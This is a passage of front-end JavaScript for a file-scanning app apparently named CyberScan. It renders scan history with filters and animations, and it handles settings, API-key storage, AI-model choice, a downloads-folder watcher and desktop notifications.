  return new Intl.DateTimeFormat(lang, full ? { dateStyle: "medium", timeStyle: "short" } : { hour: "2-digit", minute: "2-digit" }).format(d);
}
function groupOf(iso) {
  const d = new Date(iso);
  const today = new Date(); today.setHours(0, 0, 0, 0);
  const days = Math.floor((today - new Date(d.getFullYear(), d.getMonth(), d.getDate())) / 86400000);
  if (days <= 0) return "today";
  if (days === 1) return "yesterday";
  if (days < 7) return "week";
  return "earlier";
}

async function loadHistory() {
  if (state.history) { renderHistory(true); return; }
  const list = $("history-list");
  list.replaceChildren(...Array.from({ length: 5 }, () => el("div", "skeleton")));
  try { state.history = await api("/api/history"); renderHistory(true); }
  catch { list.replaceChildren(el("p", "empty-state", t("network"))); }
}

function renderHistory(animate) {
  const list = $("history-list");
  const query = $("history-search").value.trim().toLowerCase();
  const all = state.history || [];
  const rows = all.filter((r) =>
    (state.filter === "all" || (state.filter === "quarantined" ? r.quarantined : r.classification === state.filter)) &&
    (!query || r.target.toLowerCase().includes(query)));
  $("history-count").textContent = all.length ? t("count")(all.length) : "";
  if (animate && window.CSInsights) CSInsights.render(all);
  const dist = $("dist");
  dist.replaceChildren();
  ["SUSPICIOUS", "REVIEW", "NO_INDICATORS_OBSERVED"].forEach((k, i) => {
    const n = all.filter((r) => r.classification === k).length;
    if (!n) return;
    const seg = el("i");
    seg.style.flex = String(n);
    seg.style.background = `var(${RISK_COLOR[k]})`;
    seg.style.animationDelay = `${i * 0.15}s`;
    seg.title = `${t("verdicts")[k][0]}: ${n}`;
    dist.append(seg);
  });
  // FLIP: remember where each row was, so a filter or search glides rows into place
  const before = new Map();
  if (!animate) list.querySelectorAll(".row").forEach((n) => before.set(n.dataset.id, n.getBoundingClientRect().top));
  list.replaceChildren();
  if (!rows.length) { list.append(el("p", "empty-state", all.length ? t("noMatch") : t("emptyHistory"))); return; }
  let lastGroup = null;
  rows.forEach((r, i) => {
    const g = groupOf(r.timestamp);
    if (g !== lastGroup) { lastGroup = g; list.append(el("div", "group-label", t("groups")[g])); }
    list.append(historyRow(r, animate ? Math.min(i, 14) * 0.035 : 0));
  });
  if (!animate && before.size && !matchMedia("(prefers-reduced-motion: reduce)").matches) {
    list.querySelectorAll(".row").forEach((n) => {
      const was = before.get(n.dataset.id);
      n.style.opacity = "1";
      n.style.animation = "none";
      if (was === undefined) { n.animate([{ opacity: 0, transform: "scale(.96)" }, { opacity: 1, transform: "none" }], { duration: 380, easing: "cubic-bezier(.22,1,.36,1)" }); return; }
      const dy = was - n.getBoundingClientRect().top;
      if (Math.abs(dy) > 1) n.animate([{ transform: `translateY(${dy}px)` }, { transform: "none" }], { duration: 520, easing: "cubic-bezier(.22,1,.36,1)" });
    });
  }
}

function historyRow(r, delay) {
  const row = el("div", "row");
  row.dataset.id = r.id;
  row.tabIndex = 0;
  row.setAttribute("role", "button");
  row.style.setProperty("--c", `var(${RISK_COLOR[r.classification] || "--muted"})`);
  row.style.setProperty("--d", `${delay}s`);
  const mini = el("div", "mini");
  mini.style.setProperty("--p", Math.max(3, r.score));
  mini.append(el("span", "", String(r.score)));
  const main = el("div", "row-main");
  const name = r.target.split(/[\\/]/).filter(Boolean).pop() || r.target;
  const title = el("strong", "", r.target.startsWith("http") ? r.target : name);
  title.title = r.target;
  main.append(title, el("small", "", formatWhen(r.timestamp, groupOf(r.timestamp) !== "today")));
  const tags = el("div", "row-tags");
  tags.append(el("span", "row-tag", (t("verdicts")[r.classification] || [r.classification])[0]));
  if (r.quarantined) tags.append(el("span", "row-tag q", "🔒 " + t("inQuarantine")));
  const del = el("button", "row-del");
  del.type = "button";
  del.setAttribute("aria-label", t("delete"));
  del.innerHTML = TRASH;
  del.addEventListener("click", (e) => { e.stopPropagation(); deleteRecord(r, row, name); });
  row.append(mini, main, tags, del);
  row.addEventListener("click", () => openRecord(r.id));
  row.addEventListener("keydown", (e) => {
    if (e.target !== row) return;
    if (e.key === "Enter" || e.key === " ") { e.preventDefault(); openRecord(r.id); }
    if (e.key === "Delete") deleteRecord(r, row, name);
  });
  return row;
}

async function openRecord(id) {
  try {
    const result = await api(`/api/history/${id}`);
    state.lastResult = result;
    location.hash = "#/scan";
    renderResult(result, true);
  } catch { toast(t("reportGone")); }
}

async function deleteRecord(record, row, name) {
  if (!(await confirmDialog(t("delTitle"), t("delBody")(name), t("remove")))) { row.focus(); return; }
  try { await api(`/api/history/${record.id}`, { method: "DELETE" }); } catch (err) { toast(err.message); return; }
  state.history = state.history.filter((r) => r.id !== record.id);
  if (window.CSInsights) CSInsights.render(state.history);
  row.classList.add("leaving");
  row.addEventListener("animationend", () => renderHistory(false), { once: true });
  toast(t("removed"));
}

$("history-search").addEventListener("input", () => renderHistory(false));
document.querySelectorAll(".chip").forEach((chip) => chip.addEventListener("click", () => {
  state.filter = chip.dataset.filter;
  document.querySelectorAll(".chip").forEach((c) => c.classList.toggle("active", c === chip));
  renderHistory(false);
}));

/* ===================================================================
 * Settings
 * =================================================================== */
const settingInputs = [...document.querySelectorAll("#view-settings [data-key]")];

async function loadSettings() {
  try {
    state.settings = await api("/api/settings");
    document.body.classList.toggle("public-mode", !!state.settings.public);   // the online version
    renderSettings(); applyPrefs(); watchEvents();
  } catch { /* keep defaults */ }
}

function renderSettings() {
  const s = state.settings;
  if (!s) return;
  settingInputs.forEach((input) => {
    const value = s[input.dataset.key];
    if (input.type === "checkbox") input.checked = !!value;
    else input.value = Math.round(value / (Number(input.dataset.scale) || 1));
  });
  $("folder-out").textContent = s.monitoring_directory || "";
  updateOutputs();
  renderWatchPill();
}

function updateOutputs() {
  const size = settingInputs.find((i) => i.dataset.key === "maximum_file_size");
  const time = settingInputs.find((i) => i.dataset.key === "analysis_timeout");
  $("size-out").textContent = t("mb")(size.value);
  $("time-out").textContent = t("sec")(time.value);
}

function applyPrefs() {
  const s = state.settings || {};
  document.documentElement.classList.toggle("large", !!s.large_text);
  document.documentElement.classList.toggle("still", s.animated_background === false);
  requestAnimationFrame(() => { moveNavInk(); moveInk(); });
}

let saveTimer = null;
const pending = {};
function setSaveState(cls, text) { const n = $("save-state"); n.className = `save-state ${cls}`; n.textContent = text; }

function queueSetting(key, value, delay = 150) {
  pending[key] = value;
  state.settings = { ...state.settings, ...pending };
  applyPrefs();
  updateOutputs();
  setSaveState("saving", t("saving"));
  clearTimeout(saveTimer);
  saveTimer = setTimeout(saveSettings, delay);
}

settingInputs.forEach((input) => {
  const handler = () => {
    const scale = Number(input.dataset.scale) || 1;
    queueSetting(input.dataset.key, input.type === "checkbox" ? input.checked : Number(input.value) * scale, input.type === "range" ? 450 : 150);
  };
  input.addEventListener(input.type === "range" ? "input" : "change", handler);
});

async function saveSettings() {
  const changes = { ...pending };
  Object.keys(pending).forEach((k) => delete pending[k]);
  try {
    state.settings = await postJSON("/api/settings", changes, "PUT");
    setSaveState("saved", `✓ ${t("saved")}`);
    renderSettings();
    if ("ai_summary_enabled" in changes || "ai_model" in changes) loadAiStatus(true);
    watchEvents();
  } catch (err) {
    setSaveState("error", t("saveFailed") + err.message);
    loadSettings();
  }
}

$("pick-folder").addEventListener("click", async () => {
  try {
    const picked = await postJSON("/api/pick", { kind: "folder" });
    if (picked.path) { $("folder-out").textContent = picked.path; queueSetting("monitoring_directory", picked.path); }
  } catch (err) { toast(err.message); }
});

function renderAiSettings() {
  const ai = state.ai;
  if (!ai) return;
  const select = $("ai-model");
  const current = (state.settings && state.settings.ai_model) || ai.model;
  const models = [...new Set([current, ...(ai.models || [])])];
  select.replaceChildren(...models.map((m) => { const o = el("option", "", m); o.value = m; o.selected = m === current; return o; }));
  const stateLine = $("ai-state");
  stateLine.replaceChildren(el("span", `ai-dot ${ai.state}`), document.createTextNode(t("aiState")[ai.state] || ai.state));
}
$("ai-model").addEventListener("change", (e) => queueSetting("ai_model", e.target.value));

async function loadKeys() {
  try {
    const keys = await api("/api/keys");
    Object.entries(keys).forEach(([k, on]) => { const n = $(`k-${k}`); if (n) { n.textContent = on ? `● ${t("keySaved")}` : t("keyNone"); n.classList.toggle("on", on); } });
  } catch { /* DPAPI unavailable */ }
}
$("keys-save").addEventListener("click", async () => {
  const changes = {};
  document.querySelectorAll("[data-secret]").forEach((f) => { if (f.value.trim()) changes[f.dataset.secret] = f.value.trim(); });
  if (!Object.keys(changes).length) return;
  try {
    await postJSON("/api/keys", changes, "PUT");
    document.querySelectorAll("[data-secret]").forEach((f) => { f.value = ""; });
    toast(t("keysSaved"));
    loadKeys();
  } catch (err) { toast(t("saveFailed") + err.message); }
});

/* downloads watch */
let eventsTimer = null;
function renderWatchPill() {
  const on = state.settings && state.settings.monitor_state === "on";
  $("watch-pill").hidden = !on;
  if (on) $("watch-pill").querySelector("span").textContent = t("watchOn");
}
function watchEvents() {
  clearTimeout(eventsTimer);
  if (!state.settings || state.settings.monitor_state !== "on") return;
  const tick = async () => {
    try {
      const res = await api(`/api/events?since=${state.eventsSince}`);
      res.events.forEach((ev) => {
        state.eventsSince = Math.max(state.eventsSince, ev.id);
        toast(t("downloadSeen")(ev.name), { label: t("scanIt"), run: () => scanPath(ev.path) });
        notify(ev.name, t("downloadSeen")(ev.name), () => scanPath(ev.path));
      });
    } catch { /* server gone */ }
    eventsTimer = setTimeout(tick, 4000);
  };
  api("/api/events?since=0").then((res) => {
    res.events.forEach((ev) => { state.eventsSince = Math.max(state.eventsSince, ev.id); });
    eventsTimer = setTimeout(tick, 4000);
  }).catch(() => {});
}

/* ---------------- boot ---------------- */
/* desktop notifications, only when the window is in the background */
function notificationsOn() {
  try { return localStorage.getItem("cs-notify") === "1" && "Notification" in window && Notification.permission === "granted"; } catch { return false; }
}
function notify(title, body, onClick) {
  if (!notificationsOn() || !document.hidden) return;
  const n = new Notification(`CyberScan · ${String(title).split(/[\\/]/).pop()}`, { body, icon: "icon.svg", tag: "cyberscan" });
  n.onclick = () => { window.focus(); n.close(); if (onClick) onClick(); };
}

function showResult(result) {
  state.lastResult = result;
  location.hash = "#/scan";
  renderResult(result, true);
}

window.CS = {
  t, api, postJSON, download, toast, confirmDialog, el, $, cells, enterApp, formatBytes, scanPath,
  onLang: (fn) => langListeners.push(fn), get lang() { return lang; },
  get settings() { return state.settings; }, state, openRecord, showResult, notify, notificationsOn,
  newScan, chooseFiles, setMode: (m) => tabs.find((x) => x.dataset.mode === m)?.click(),
  toggleLang: () => openLangMenu(), setLang,
};
document.addEventListener("DOMContentLoaded", () => {
  applyLang();
  if (!I18N[lang]) CS_LANGS.load(lang).then(applyLang).catch(() => { lang = "en"; applyLang(); });
  route();
  loadSettings();
  loadAiStatus();
});
